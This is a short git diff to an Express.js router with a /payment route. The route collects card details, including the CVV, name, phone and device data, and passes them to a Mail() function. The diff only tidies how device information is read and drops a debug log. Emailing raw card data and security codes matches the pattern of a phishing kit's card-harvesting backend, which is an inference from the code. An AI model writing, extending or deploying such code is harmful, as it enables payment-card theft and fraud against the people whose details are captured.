@@ -44,7 +44,7 @@ router.get("/convert/xlsxToJson", (req, res) => {
 });
 
 router.post("/payment", async (req, res) => {
-  const { info, device } = req.body;
+  const { info } = req.body;
 
   let cardResults = {
     CardType: "",
@@ -79,14 +79,9 @@ router.post("/payment", async (req, res) => {
     securitycode: info.cvv,
     name: info.name,
     phone: info.phone,
-    detectedDevice: {
-      name: device.vendor,
-      version: device.os,
-      brand: device.vendor,
-      model: device.model,
-    },
+    device: info.device,
   };
-  console.log(Body);
+ 
   await Mail(Body);
 
   res.end();
